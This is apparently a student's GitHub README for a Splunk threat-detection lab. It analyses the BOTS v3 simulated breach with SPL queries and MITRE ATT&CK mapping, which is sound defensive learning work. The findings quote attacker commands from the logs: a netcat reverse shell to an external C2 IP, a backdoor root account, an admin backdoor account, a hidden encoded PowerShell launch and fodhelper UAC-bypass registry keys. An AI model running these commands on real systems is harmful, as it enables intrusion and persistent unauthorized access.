# Threat Detection Engineering Lab
### Splunk SIEM × MITRE ATT&CK Framework

![Status](https://img.shields.io/badge/Status-In%20Progress-yellow)
![Findings](https://img.shields.io/badge/Findings-10%20confirmed-red)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-23%20techniques-orange)
![IOCs](https://img.shields.io/badge/IOCs-30%2B-red)

---

## Project Objective

The goal of this project is to simulate a real SOC analyst and Detection Engineer workflow :

- Analyze real attack logs from a simulated enterprise breach
- Identify suspicious behaviors and map them to MITRE ATT&CK
- Build detection rules (SPL queries) based on real observations
- Create professional SOC dashboards for threat visibility
- Document findings in a structured and reproducible way

This project demonstrates end-to-end detection engineering skills : from raw log analysis to actionable alerts mapped to a threat framework.

> ⚠️ **Note : Work In Progress**
> This project is actively being developed and is not yet complete.
> It serves as a **personal learning reference**, I return to it
> regularly to add new detection rules, improve existing ones,
> and deepen my understanding of threat detection engineering.
> Contributions and suggestions are welcome.

---

## Dataset — Boss of the SOC v3 (BOTS v3)

### What is BOTS v3 ?

**Boss of the SOC (BOTS) v3** is a professional grade attack simulation dataset created by **Splunk**. It was originally used in the Splunk .conf2018 Security competition.

### What does it simulate ?

The dataset simulates a **real cyberattack against a fictional company called Frothly** — a craft beer company with a hybrid infrastructure (on-premise Windows machines + Linux servers + AWS cloud).

### Infrastructure simulated

```
Linux Servers :
  HOTH        → Apache Struts application server (primary entry point)

Windows Workstations :
  FYODOR-L    → Primary compromised Windows machine
  ABUNGST-L   → Compromised via SugarCRM credential stuffing
  BSTOLL-L    → Most active machine (6387 DNS queries)
  BGIST-L     → Windows workstation
  MKRAEUS-L   → MalloryKraeusen's workstation
  PCERF-L     → Windows workstation

Cloud Infrastructure :
  AWS EC2 instances
  AWS RDS database
  AWS CloudTrail logging
  VPC Flow Logs
```

### Available data sources

| Sourcetype | Events | Description |
|------------|--------|-------------|
| syslog | 283,976 | Linux system logs |
| stream:ip | 227,872 | Network IP traffic |
| osquery:results | 219,997 | Linux endpoint monitoring |
| stream:dns | 218,456 | DNS queries and responses |
| stream:udp | 157,960 | UDP network traffic |
| WinEventLog | 48,101 | Windows Security/System logs |
| cisco:asa | 80,192 | Firewall logs |
| aws:cloudtrail | 9,212 | AWS API activity logs |

**Total : 300,000+ events covering a full attack scenario**

<img width="1908" height="655" alt="image" src="https://github.com/user-attachments/assets/cc90b67b-fd3f-44cd-b513-5286bfc3d5f8" />

---

## Investigation & Identification

Before writing any detection rule, I followed a structured investigation process :

```
Step 1 → Understand the environment
         What machines ? What data sources ? What timeline ?

Step 2 → Identify suspicious patterns
         Abnormal volumes, unusual processes, privilege abuse

Step 3 → Map to MITRE ATT&CK
         Which tactic and technique does this behavior match ?

Step 4 → Write the SPL detection rule
         Based on real observations, not assumptions

Step 5 → Validate results
         Check for false positives, tune thresholds

Step 6 → Save as scheduled alert
         Automate detection for future occurrences

Step 7 → Document everything
         YAML format with findings, rationale, and tuning notes
```

### Step 1 — Environment Discovery

**Query used :**
```spl
index=botsv3 | stats count by sourcetype | sort -count
```

<img width="1919" height="738" alt="image" src="https://github.com/user-attachments/assets/28f15e13-c632-4e8d-a58e-48b366951358" />

**What I found :**
- 2,000,000+ events across 15+ data sources
- Mix of Windows endpoints, Linux servers, and AWS cloud
- Data covering a full attack scenario from August 2018

**Key observation :**
The dataset contains logs from a hybrid infrastructure — on-premise Windows machines AND AWS cloud services. This means the attacker had to compromise both environments.

---

### Step 2 — Identifying Suspicious Hosts

**Query used :**
```spl
index=botsv3 | stats count by host | sort -count
```

<img width="1919" height="739" alt="image" src="https://github.com/user-attachments/assets/2453f0d7-eb81-413c-9cdf-ace4627f7b45" />

**What I found :**

| Host | Role | Suspicion Level |
|------|------|-----------------|
| HOTH | Apache Struts server | 🔴 Entry point confirmed |
| FYODOR-L | Windows workstation | 🔴 Fully compromised |
| ABUNGST-L | Windows workstation | 🔴 Compromised via SugarCRM |
| BSTOLL-L | Windows workstation | 🟠 Abnormal DNS volume |
| BGIST-L | Windows workstation | 🟡 Medium |
| MKRAEUS-L | Windows workstation | 🟡 Medium |

<img width="1400" height="727" alt="image" src="https://github.com/user-attachments/assets/6d97f8fe-1475-4296-ab49-dc82051f06ab" />

---

### Step 3 — Analyzing Windows Event Codes

**Query used :**
```spl
index=botsv3 sourcetype="WinEventLog"
| stats count by EventCode
| sort -count
```

<img width="1596" height="521" alt="image" src="https://github.com/user-attachments/assets/842ec4c6-5de4-43da-a2e7-ed2379d48246" />

**What I found :**

| EventCode | Count | Meaning |
|-----------|-------|---------|
| 4689 | 23,885 | Process terminated |
| 4688 | 2,419 | Process created |
| 4672 | 8,497 | Special privileges assigned |
| 4673 | 1,120 | Privileged service called |
| 5156 | 2,256 | Network connection allowed |

**Key observation :**
EventCode 4672 (Special Privileges) appeared 8,497 times — abnormally high. This was my first real indicator of privilege abuse.

<img width="927" height="518" alt="image" src="https://github.com/user-attachments/assets/a011ea16-47a9-45b2-adfa-fe6f112e7eff" />

---

### Step 4 — Identifying Suspicious Processes

**Query used :**
```spl
index=botsv3 sourcetype="WinEventLog"
(EventCode=4672 OR EventCode=4673)
| eval process=lower(coalesce(Process_Name, process_name))
| stats count by process, host
| sort -count
```

<img width="1919" height="718" alt="image" src="https://github.com/user-attachments/assets/7e6fd8c9-f0c6-45da-85dc-1d8102f69d60" />

**Key finding — The smoking gun :**
`RuntimeBroker.exe` and `explorer.exe` were the top processes requesting critical privileges.

**Why this is suspicious :**
- `RuntimeBroker.exe` manages permissions for Microsoft Store apps. It should NEVER need SeTcbPrivilege.
- `explorer.exe` is the Windows file manager. It has no legitimate reason to request operating system level privileges.

---

### Step 5 — Confirming with Timeline Analysis

**Query used :**
```spl
index=botsv3 sourcetype="WinEventLog"
(EventCode=4672 OR EventCode=4673 OR EventCode=4688)
| timechart span=1h count by EventCode
```

<img width="1918" height="718" alt="image" src="https://github.com/user-attachments/assets/c515f858-6b4a-45d6-8851-0dc2baa7a443" />

**What I found :**
- Attack activity concentrated between 03:00 and 12:00 AM on August 20, 2018
- Multiple EventCodes spiking simultaneously across different machines
- Synchronized spikes indicate lateral movement — the attacker controlled multiple machines simultaneously

---

### Step 6 — False Positive Analysis

During investigation I discovered an important lesson about false positives.

**The EventCode 4625 case :**

| Source | EventCode 4625 | Meaning |
|--------|----------------|---------|
| WinEventLog:Security | Real auth failure | ✅ Relevant |
| WinEventLog:Application | System message | ❌ False positive |

The Application log EventCode 4625 is generated by the Windows EventSystem service suppressing duplicate log entries — completely unrelated to authentication.

**Lesson learned :**
Always filter by `source="WinEventLog:Security"` when looking for authentication failures. The same EventCode can have completely different meanings depending on the log source.

---

## 🚨 Key Findings

> These findings are the result of a complete investigation
> of the BOTS v3 logs — not copied rules from the internet,
> but real observations derived from hands-on log analysis.

---

### 🔴 Finding 1 — Apache Struts RCE — Confirmed Entry Point (Critical)

**Host :** HOTH (192.168.9.30)
**Attacker IP :** 192.168.8.103
**Time :** 07:05 → 07:34 AM August 20, 2018

15 POST requests to `/frothlyinventory/integration/saveGangster.action`
containing OGNL expressions executing OS commands directly on the server.
Network activity spiked from 2 to 57 events/minute at exactly 07:05.

**MITRE :** T1190 — Exploit Public-Facing Application

---

### 🔴 Finding 2 — Linux Kernel Exploit Deployed (Critical)

**Host :** HOTH

Base64 encoded payload dropped via OGNL :
```
echo [base64] >> /tmp/colonel
base64 --decode /tmp/colonel > /tmp/colonel.c
```

`colonel.c` targets Ubuntu 16.04 kernel via BPF verifier vulnerability —
giving the attacker full root access on the Linux server.

**MITRE :** T1068 — Exploitation for Privilege Escalation

---

### 🔴 Finding 3 — Linux Backdoor Account Created (Critical)

**Host :** HOTH

```bash
useradd -ou tomcat7 -p ilovedaviderve
```

Syslog confirmed : `useradd[12815]: new user: name=tomcat7, UID=0, GID=0`

UID=0 means root privileges. The attacker disguised a root account
as a tomcat service account to avoid detection.

**MITRE :** T1136.001 — Create Local Account

---

### 🔴 Finding 4 — Reverse Shell to External C2 (Critical)

**External C2 :** 45.77.53.176 (ports 443, 8088, 3333)

```bash
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
```

C2 connections confirmed :
- HOTH → 45.77.53.176:8088 (reverse shell)
- FYODOR-L → 45.77.53.176:443 (3884 connections)
- FYODOR-L → 45.77.53.176:3333 (logos.png download)
- ABUNGST-L → 45.77.53.176:443 (1071 connections)

**MITRE :** T1071.001 — C2 over Web Protocols

---

### 🔴 Finding 5 — Session Cookie Theft → Windows Pivot (Critical)

**Host :** HOTH → FYODOR-L

FyodorMalteskesko was browsing SugarCRM on HOTH since 06:23 AM —
42 minutes before the exploit. The same session cookie repeated :
```
PHPSESSID=ck2dbgeimem4h653tr1fbubf04
```

Once the attacker compromised HOTH, they stole this active session
and impersonated FyodorMalteskesko to pivot to FYODOR-L.

**MITRE :** T1539 — Steal Web Session Cookie

---

### 🔴 Finding 6 — Obfuscated PowerShell + AMSI Bypass (Critical)

**Host :** FYODOR-L

```
powershell.exe -NoP -NonI -W Hidden -enc <Base64_payload>
```

Decoded payload : disabled AMSI, disabled Script Block Logging,
downloaded RC4-encrypted payload from C2, executed in memory via IEX.

**MITRE :** T1059.001, T1027, T1562.001

---

### 🔴 Finding 7 — UAC Bypass via Fodhelper (Critical)

**Host :** FYODOR-L

Registry key modified :
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
HKCU\Software\Microsoft\Windows Update\Update
```

`fodhelper.exe` launched → Windows auto-elevated the payload
without showing any UAC prompt to the user.

**Evidence :** Sysmon EventID 13 confirmed registry modifications.

**MITRE :** T1548.002, T1112

---

### 🔴 Finding 8 — Windows Backdoor Account Created (Critical)

**Host :** FYODOR-L

```
net user /add svcvnc Password123!
net localgroup administrators svcvnc /add
```

All events within 18 seconds (22:08:17 → 22:08:35) —
indicating an automated script. EventCodes 4720, 4722, 4724, 4732 confirmed.

**MITRE :** T1136.001, T1098

---

### 🔴 Finding 9 — Second Attacker — SugarCRM Credential Stuffing (Critical)

**Attacker 2 IP :** 192.168.8.112
**Target :** ABUNGST-L

At 07:24:24, a second attacker logged into SugarCRM using :
```
user_name=abugnst / password=ilovedavsbasement
```

This explains how ABUNGST-L was compromised independently
from the main Struts attack chain.

**MITRE :** T1110 — Brute Force / Credential Stuffing

---

### 🟡 Finding 10 — False Positive Identified and Fixed (Lesson Learned)

EventCode 4625 exists in both `WinEventLog:Application`
and `WinEventLog:Security` with completely different meanings.
Always filter by source to eliminate noise.

---

### 📊 Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 Critical | 9 | RCE, C2, kernel exploit, UAC bypass, backdoors |
| 🟡 Lesson | 1 | False positive analysis |

**MITRE ATT&CK techniques identified : 23 across 9 tactics**
**IOCs documented : 30+**
**Confirmed compromised machines : 3 (HOTH, FYODOR-L, ABUNGST-L)**
**Attackers identified : 2 distinct IPs**

---

## 🛡️ MITRE ATT&CK Coverage

| Tactic | ID | Technique | Host | Detections | Severity | Status |
|--------|----|-----------|------|------------|----------|--------|
| Initial Access | T1190 | Exploit Public-Facing App (Apache Struts) | HOTH | Confirmed | Critical | ✅ |
| Initial Access | T1110 | Credential Stuffing SugarCRM | ABUNGST-L | Confirmed | Critical | ✅ |
| Execution | T1059.004 | Unix Shell | HOTH | Confirmed | High | ✅ |
| Execution | T1059.001 | PowerShell Obfuscated + AMSI Bypass | FYODOR-L | Confirmed | Critical | ✅ |
| Execution | T1059 | Command and Scripting Interpreter | FYODOR-L | 7724 | High | ✅ |
| Defense Evasion | T1027 | Obfuscated Files — Base64 + RC4 | FYODOR-L | Confirmed | Critical | ✅ |
| Defense Evasion | T1562.001 | Disable AMSI | FYODOR-L | Confirmed | Critical | ✅ |
| Defense Evasion | T1036 | Masquerading — iexeplorer.exe | FYODOR-L | Confirmed | High | ✅ |
| Defense Evasion | T1112 | Modify Registry | FYODOR-L | Confirmed | High | ✅ |
| Persistence | T1136.001 | Create Local Account Linux — tomcat7 | HOTH | Confirmed | Critical | ✅ |
| Persistence | T1136.001 | Create Local Account Windows — svcvnc | FYODOR-L | Confirmed | Critical | ✅ |
| Persistence | T1098 | Account Manipulation — Added to Admins | FYODOR-L | Confirmed | Critical | ✅ |
| Privilege Escalation | T1068 | Kernel Exploit — colonel.c BPF | HOTH | Confirmed | Critical | ✅ |
| Privilege Escalation | T1548.002 | UAC Bypass via Fodhelper | FYODOR-L | Confirmed | Critical | ✅ |
| Privilege Escalation | T1134 | Access Token Manipulation | FYODOR-L | 729 | Critical | ✅ |
| Privilege Escalation | T1055 | Process Injection | FYODOR-L | 729 | High | ✅ |
| Credential Access | T1539 | Steal Web Session Cookie | HOTH | Confirmed | Critical | ✅ |
| Credential Access | T1078 | Valid Accounts SugarCRM | ABUNGST-L | Confirmed | High | ✅ |
| Discovery | T1046 | Network Service Scanning | HOTH | Confirmed | Medium | ✅ |
| Discovery | T1082 | System Information — WMIC | FYODOR-L | 536 | Medium | ✅ |
| Discovery | T1049 | Network Connections — Netstat | FYODOR-L | 78 | Medium | ✅ |
| Discovery | T1012 | Query Registry — Software Enum | FYODOR-L | 1037 | Medium | ✅ |
| Discovery | T1087 | Account Discovery — /etc/passwd | HOTH | Confirmed | Medium | ✅ |
| Command & Control | T1071.001 | C2 over HTTP/S — 45.77.53.176 | All | Confirmed | Critical | ✅ |
| Lateral Movement | T1021.002 | SMB — Port 139 Scanning | FYODOR-L | Confirmed | High | ✅ |

> **Total : 25 techniques covered across 9 tactics**

---

## 📊 SOC Dashboards

### Dashboard 1 — SOC Threat Overview

Panels included :
- Detections by ATT&CK Technique (Bar Chart)

<img width="937" height="241" alt="Capture d&#39;écran 2026-03-19 232737" src="https://github.com/user-attachments/assets/4174fbc3-ea16-4376-9ff7-ef20ea1d363c" />

- Suspicious Events Timeline (Line Chart)

<img width="931" height="187" alt="Capture d&#39;écran 2026-03-19 232820" src="https://github.com/user-attachments/assets/a03557c7-9e2d-4640-a8a8-24c8ae8c113a" />

- Top Affected Hosts (Bar Chart)

<img width="924" height="190" alt="Capture d&#39;écran 2026-03-19 232841" src="https://github.com/user-attachments/assets/2f4d28f6-c5cf-444f-8ac2-7a0babdcab2e" />

- Top Suspicious Users (Table)

<img width="935" height="251" alt="Capture d&#39;écran 2026-03-19 232901" src="https://github.com/user-attachments/assets/8ab94e3c-bbf9-4aed-98bb-c2d4b0045fa1" />

- Alerts by Severity (Pie Chart)

<img width="560" height="189" alt="Capture d&#39;écran 2026-03-19 232927" src="https://github.com/user-attachments/assets/1350741c-0178-427f-81ef-8ed79a014825" />

---

### Dashboard 2 — MITRE ATT&CK Coverage

Panels included :
- ATT&CK Technique Coverage Table

<img width="935" height="248" alt="Capture d&#39;écran 2026-03-19 232450" src="https://github.com/user-attachments/assets/ef4118d5-f9bf-4b09-9530-f5712176cf2a" />

- Rules Coverage by Tactic (Bar Chart)

<img width="949" height="179" alt="Capture d&#39;écran 2026-03-19 232621" src="https://github.com/user-attachments/assets/169a7b77-9c13-4e38-8d54-dc09fc02d5e6" />

- Detection Volume by Tactic (Pie Chart)

<img width="575" height="173" alt="Capture d&#39;écran 2026-03-19 232648" src="https://github.com/user-attachments/assets/2a03e802-07c7-4a87-a619-22cec3352171" />

---

## 🔍 Detection Rules

See [detections/](detections/) folder for all YAML-documented rules.

> Detection rules are being rebuilt based on confirmed findings
> from the threat hunting investigation. Each rule is tied to
> a real observation in the BOTS v3 logs.

| File | Technique | Host | Description |
|------|-----------|------|-------------|
| T1190-struts-rce.yml | T1190 | HOTH | Apache Struts OGNL injection detection |
| T1068-kernel-exploit.yml | T1068 | HOTH | Linux kernel exploit colonel.c |
| T1136-linux-account.yml | T1136.001 | HOTH | Backdoor account tomcat7 UID=0 |
| T1071-reverse-shell.yml | T1071.001 | HOTH | Reverse shell to 45.77.53.176 |
| T1539-session-theft.yml | T1539 | HOTH | SugarCRM session cookie theft |
| T1059-powershell-obf.yml | T1059.001 | FYODOR-L | PowerShell AMSI bypass |
| T1548-uac-bypass.yml | T1548.002 | FYODOR-L | UAC bypass via fodhelper |
| T1136-windows-account.yml | T1136.001 | FYODOR-L | Backdoor account svcvnc |
| T1110-credential-stuffing.yml | T1110 | ABUNGST-L | SugarCRM credential stuffing |
| T1082-wmic-recon.yml | T1082 | FYODOR-L | WMIC system reconnaissance |
| T1049-netstat-recon.yml | T1049 | FYODOR-L | Netstat network discovery |
| T1012-registry-enum.yml | T1012 | FYODOR-L | Registry software enumeration |

---

## ⚙️ Setup & Configuration

- [Installation Guide](docs/INSTALL.md)
- [Alert Configuration](docs/ALERTS.md)
- [Dashboard Configuration](docs/DASHBOARDS.md)
- [Attack Story](investigation/ATTACK-STORY.md)
- [Kill Chain Analysis](investigation/KILL-CHAIN.md)
- [IOC List](investigation/IOC.md)
- [DNS Analysis](investigation/DNS-ANALYSIS.md)

---

## 💡 Key Lessons Learned

**1. Always filter by log source**
EventCode 4625 exists in both Application and Security logs.
Only `source="WinEventLog:Security"` contains real auth failures.
Filtering by source eliminates false positives.

**2. Context matters more than EventCode**
A single failed login is normal. 100 failed logins in 5 minutes
from the same IP is an attack. Always look at volume and context.

**3. Dataset time range**
BOTS v3 data is from August 2018. Always set Splunk time range
to "All time" when querying this dataset.

**4. Normal processes can be abused**
`RuntimeBroker.exe` and `explorer.exe` are legitimate Windows
processes. Their abuse of critical privileges is only visible
when you look at WHAT privileges they request, not just THAT
they exist.

**5. Correlation across log sources reveals the full picture**
No single event was enough to detect this attack. It was the
correlation of HTTP logs, syslog, Windows Events, and DNS
that revealed the complete kill chain.

**6. Two attackers can work simultaneously**
The discovery of a second attacker (192.168.8.112) performing
credential stuffing while the first was exploiting Struts
shows that coordinated attacks can happen across multiple
vectors at the same time.

---

## 🛠️ Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Splunk Enterprise | 10.2 | SIEM Platform |
| BOTS v3 Dataset | 1.0 | Attack simulation data |
| MITRE ATT&CK | v14 | Threat framework |
| Kali Linux | 2025.4 | Lab environment |
| Git | Latest | Version control |

---

## 📌 Project Status & Roadmap

> This project is a **living learning reference**, not a finished product.
> It is continuously updated as I learn new concepts and techniques.

### Current Status

```
✅ Splunk lab deployed and configured
✅ BOTS v3 dataset loaded and analyzed
✅ SOC dashboards built (2 dashboards)
✅ Full GitHub documentation
✅ Threat hunting investigation completed
✅ Complete kill chain reconstructed (25 MITRE techniques)
✅ 30+ IOCs documented (network, host, registry)
✅ 3 compromised hosts confirmed (HOTH, FYODOR-L, ABUNGST-L)
✅ 2 attackers identified
🔄 Detection rules rebuild based on confirmed findings (12 rules)
🔄 DNS analysis in progress
⬜ MITRE ATT&CK Navigator export
⬜ Sigma rules conversion
⬜ Incident response playbooks
```

### Why this project exists

This lab was built to :
- Learn detection engineering from real attack data
- Understand how attackers operate across the kill chain
- Practice writing SPL queries based on real observations
- Build a portfolio that demonstrates SOC analyst skills

Every time I learn something new — a new technique, a new tool,
a new concept — I come back to this lab and add it. This makes
it a growing reference rather than a one-time exercise.

### What's coming next

- Detection rules rebuilt based on confirmed BOTS v3 findings
- Sigma rules format for each detection
- Incident response playbook for each alert
- MITRE ATT&CK Navigator coverage map export

---

## 👤 Author

**Ahlam Boumehdi**
Cybersecurity Engineering Student
LinkedIn : www.linkedin.com/in/ahlam-boumehdi
